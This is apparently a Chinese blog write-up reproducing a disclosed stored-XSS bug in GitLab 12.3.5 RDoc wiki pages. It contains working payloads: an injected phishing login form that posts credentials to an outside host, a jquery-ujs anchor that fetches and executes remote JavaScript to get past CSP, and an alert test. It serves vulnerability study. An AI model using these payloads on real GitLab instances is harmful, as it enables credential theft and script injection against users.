---
layout: post
title: "Reproduction: Gitlab Cross-site Scripting (XSS) - Stored in RDoc wiki pages"
date: 2023-12-25 10:31:06 +0800
categories: xss
---

## Name

> Gitlab Cross-site Scripting (XSS) - Stored in RDoc wiki pages

## Weakness

> XSS

## Severity

> 高危

## Environment

> Ubuntu 18.04
> gitlab 12.3.5

> 原文：[https://hackerone.com/reports/662287](https://hackerone.com/reports/662287)

## URL

## Summary

该漏洞存在于用 md 构建 wikipage 这一过程，由于后端没有对 rdoc(和 markdown 很像，ruby 文档生成器)进行严格处理，导致用户能够注入大量 html 代码，这个漏洞太经典了，后续很多漏洞都是以此为基础而利用。

![rdoc](/assets/gitlab/1/rdoc.png)

报告过程

1. 2019 年 7 月 28 日，首先找到 rdoc 渲染问题，用户能够将 image 嵌入到 a 标签中，并且能够注入 class 属性。
2. 注入的 class 属性利用了原应用的类，将 a 标签 z-index 置顶，诱导用户点击。
3. 用户甚至能够注入 html 代码，构造钓鱼弹框。但是还没涉及到 xss。（以上是 ruby 后端渲染漏洞）
4. 攻击者发现可以注入特定类的 html 代码，拼接前端的 jquery 代码，实现 xss 注入。该处还未实现 csp 绕过。
5. 2 个月后，2019 年 10 月 13 日，该漏洞还未修复。并且 gitlab 引用了新的漏洞代码 jquery-ujs，利用 data-method 属性，实现 csp 绕过。（以上是前端漏洞）
6. 总结下来，该漏洞分为三部分，第一部分是 html 注入，第二部分是 xss 注入，第三部分是 csp 绕过。
7. 因此，复现以最新版本进行，2019 年 10 月 13 日发布的 gitlab12.3.5。

要点：

1. class 注入，改变元素外观，从而触发点击
2. a 标签包围 img 标签，img 设置为无限大，触发点击
3. jquery-ujs 的 data-method
   jquery-ujs 提供了一些额外的特性，如将 data-remote 属性应用到链接和表单上，然后使用 AJAX 请求提交数据，或者利用 data-confirm 属性显示确认对话框。

### backend, rails

payload

```
a form
{
<div class="modal show d-block">
<div class="modal-dialog">
<div class="modal-content">
<div class="modal-header">
<h3 class="page-title">Please Log In</h3>
</div>
<div class="modal-body">
<form class="new-wiki-page" action="http://aw.rs/">
<div class="form-group">
<label for="username"><span>Username</span></label>
<input type="text" name="username" id="username" class="form-control">
<label for="password"><span>Password</span></label>
<input type="password" name="password" id="password" class="form-control">
</div>
<div class="form-actions"><button name="button" type="submit" class="btn btn-success">Login</button></div>
</form>
</div>
</div>
</div>
</div>
}[/]
```

可以看到能够注入 `div、h3、form、label、input` 等标签，以及 `class、action、id、type` 等属性。 后端渲染时可以注入部分标签、class 和部分属性，但是 data 属性无法注入，应该是后端做了过滤。因此才会利用前端 gadget 来注入新的包含 `data-*`属性的 a 标签，因此该攻击的本质是，首先通过后端注入有限的 html，然后再通过前端 gadget 来注入无限的 html。
提交该数据的 url 为 post 方法：*http://10.206.44.19:8033/root/xss/wikis*

### frontend, jquery gadgets

需要点击触发 jquery-ujs 的 data-method 方法，也就是说只要网站支持 jqeury-ujs，并且能够注入 a 标签及其属性，那么 xss 必然出现

payload1:

```
{
<form class="gl-show-field-errors">
<input type="text" title="&#x3C;/p&#x3E;&#x3C;a data-remote=&#x22;true&#x22; data-confirm=&#x22;Are you sure&#x22; data-method=&#x22;get&#x22; data-type=&#x22;script&#x22; href=&#x22;https://gitlab.com/vakzz-h1/public/-/raw/master/test.js&#x22; class=&#x27;atwho-view select2-drop-mask pika-select&#x27;&#x3E;&#x3C;img height=10000 width=10000&#x3E;&#x3C;/a&#x3E;">
}[#]
```

后端渲染结果：

```
<form class="xxx"><input type="" title="xxx">
```

前端渲染后：

```
<form><a data-method='get'><img></a></form>
```

经过测试 jquery-ujs 会直接执行 script，如下面代码片段，在最新版本上测试可以 xss：

```
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-ujs/1.2.3/rails.js"></script>
<a data-remote="true" data-confirm="Are you sure" data-method="get" data-type="script"
        href="https://gitlab.com/vakzz-h1/public/-/raw/master/test.js">
        jquery-ujs xss test
</a>
```

其中 data-type 对应 ajax 的 type 字段，参考

- [https://github.com/rails/jquery-ujs/wiki/Unobtrusive-scripting-support-for-jQuery-%28list-of-data-attributes%29#data-type](https://github.com/rails/jquery-ujs/wiki/Unobtrusive-scripting-support-for-jQuery-%28list-of-data-attributes%29#data-type)
- [https://api.jquery.com/jQuery.ajax/](https://api.jquery.com/jQuery.ajax/)

```
dataType (default: Intelligent Guess (xml, json, script, or html))
"script": Evaluates the response as JavaScript and returns it as plain text. Disables caching by appending a query string parameter, _=[TIMESTAMP], to the URL unless the cache option is set to true. Note: This will turn POSTs into GETs for remote-domain requests. an XML MIME type will yield XML, in 1.4 JSON will yield a JavaScript object, in 1.4 script will execute the script, and anything else will be returned as a string
```

例如在 chrome-tools control+p 搜索：jquery-ujs 关键字，看目标网站是否有该库

![ujs](/assets/gitlab/1/ujs.png)

payload2:

```
{
<form class="gl-show-field-errors">
<input type="text" title="<script>alert(11)</script>">
}[#]
```

从下一个复现漏洞中得知利用前端 jquery 片段的漏洞，由于该漏洞需要在页面初始化时才会调用，而本次复现，后端渲染的漏洞代码直接通过路由页面返回。因此 main.js 得以执行触发该漏洞。
